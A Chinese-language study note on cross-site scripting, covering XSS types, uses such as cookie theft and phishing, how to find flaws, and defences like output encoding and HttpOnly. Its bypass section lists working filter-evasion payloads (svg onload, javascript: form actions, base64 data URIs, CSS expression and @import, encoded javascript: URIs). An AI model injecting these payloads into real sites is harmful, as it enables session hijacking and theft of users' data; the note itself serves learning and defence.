# XSS NOTE

### 分类

反射型、存储型、DOM型

DOM型：通过修改DOM结点形成的XSS

反射型和存储型与服务器交互，DOM型则不

### 危害

网络钓鱼

网页挂马

盗取Cookie

Dos攻击

钓鱼攻击

蠕虫攻击

结合CSRF攻击

强制弹出广告、刷流量

### 利用方式

Cookie窃取（同源策略：同协议、同域名、同端口）

设置了HTTPOnly可以通过调试信息、phpinfo()方式获得

会话劫持（Cookie、Session）

钓鱼（嵌入iframe）

XSS重定向钓鱼

HTML注入式钓鱼（通过js修改页面DOM对象属性，或在原页面中添加新的DOM元素，前者更隐蔽）

反射型XSS：攻击者通过电子邮件等方式将包含XSS代码的恶意链接发送给目标用户。当目标用户访问该链接时，服务器接受该目标用户的请求并进行处理，然后服务器把带有XSS的代码发送给目标用户的浏览器，浏览器解析这段带有XSS代码的恶意脚本后，就会触发XSS漏洞

存储型XSS：攻击者在发帖或留言的过程中，将恶意脚本连同正常信息一起注入到发布内容中。随着发布内容被服务器存储下来，恶意脚本也将永久的存放到服务器的后端存储器中。当其他用户浏览这个被注入了恶意脚本的帖子时，恶意脚本就会在用户的浏览器中得到执行

DOM型XSS：用户请求一个经过专门设计的URL，它由攻击者提供，而且其中包含XSS代码。服务器的响应不会以任何形式包含攻击者的脚本，当用户的浏览器处理这个响应时，DOM对象就会处理XSS代码，导致存在XSS漏洞

### 挖掘

**白盒：**查找可能在页面输出的变量，检验他们是否受到控制，然后跟踪变量的传递过程，分析是否被htmlencode()之类的函数过滤

**黑盒：** 输入框处，可能存在所有类型XSS；URL参数，可能存在反射型+DOM型

1. 数据交互的地方

- get、post、cookies、headers
- 反馈与浏览
- 富文本编辑器
- 各类标签插入和自定义

2. 数据输出的地方

- 用户资料
- 关键词、标签、说明
- 文件上传

### 绕过

1. 空格、回车和TAB

在js中只会将分号`;`作为语句的终止符，当浏览器引擎解析js脚本时没有匹配到分号则继续处理，直到发现分号为止，而换行符并不是终止符

```html
<img src=javasc
     ript:aler
     t(/xss/) />
```

2. ASCII转码

```html
<img src="javascript:alert(/xss/);" />
```

替换成

```html
<img src="javascrip&#116&#58alert(/xss/);" />
```

在ASCII表中，116表示`t`，58表示`:`

**也可以将&#01,&#02插入javascript头部，还可以将tab(&#09)、换行符(&#10)、回车符(&#13)插入代码中**

3. 扰乱规则

- 大小写变换
- 利用expression执行xss时，可以构造不同的**全角**字符来扰乱过滤规则
- 结合注释符
- 样式标签会过滤`\`和`\0`，可以构造`@i\mp\0ort 'jav\0asc\0rip\0t:al\0er\t("x\0ss")';`绕过
- 对css关键字进行编码处理，如unicode编码字母e后为65

4. 字符编码

unicode、escapes、八进制、十进制、十六进制、URL编码、String.fromCharCode编码

5. 拆分法

如果一个网站规定了输入最大长度，但是shellcode太长，可以拆分成几部分再组合起来

6. 使用未过滤事件名

```html
onstop
onReverse
onURLFilp
onPause
onstop
onmouseover
```

7. 使用CSS绕过（受浏览器版本限制，不推荐）

css样式表也可以执行javascript代码

```html
<link rel="stylesheet" href="http://www.myweb.com/attack.css">
```

```html
<div style="background-image: url(javascript:alert('xss'))"></div>
```

```html
<style type="text/css">
	body{
		background-image: url("javascript:alert('xss')");
	}
</style>
```

css中使用expression执行javascript(IE6以下)

```html
<div style="width: expression (alert('XSS'));"></div>
<img src="#" style="xss:expression(alert(/xss/))">
```

css中使用@import执行javascript

```html
<style>
	@import 'javascript:alert("xss")';
</style>
```

8. svg标签

```html
<svg onload=alert(1)>
```

9. form标签

```html
<form action=javascript:alert('xss') method="get">
<form action=javascript:alert('xss')>
```

```html
<form method=post action=aa.asp? onmouseover=prompt('xss')>
<form method=post action=aa.asp? onmouseover=alert('xss')>
<form action=1 onmouseover=alert('xss)>
```

```html
<!--原code-->
<form method=post action="data:text/html;base64,<script>alert('xss')</script>">
<!--base64编码-->
<form method=post action="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=">
```

10. input标签

```html
<input name="name" value="" onmouseover=prompt('xss') bad="">
```

### 防御

- 输入

严控用户输入内容，如手机号只允许输入11位数字，其他为非法字符

尽量采用白名单验证

- 输出

输出的地方使用HTML编码将特殊字符转义为实体符

htmlspecialchar(string,quotestyle)：实体编码函数，默认只编码双引号，使用时第二个参数带上ENT_QUOTES更安全，同时编码单引号和双引号

`<` 编码成 `&lt;`

`>` 编码成 `&gt;`

`''` 编码成 `&#039;`

`"` 编码成 `&quot;`

`&` 编码成 `&amp;`

htmlspecialchars_decode(string,quotestyle)：实体解码函数，转换为实体形式，输出时浏览器会自动还原

- 其他

使用Noscript插件禁止所有脚本，可自定义设置允许的脚本

设置HttpOnly

开启WAF

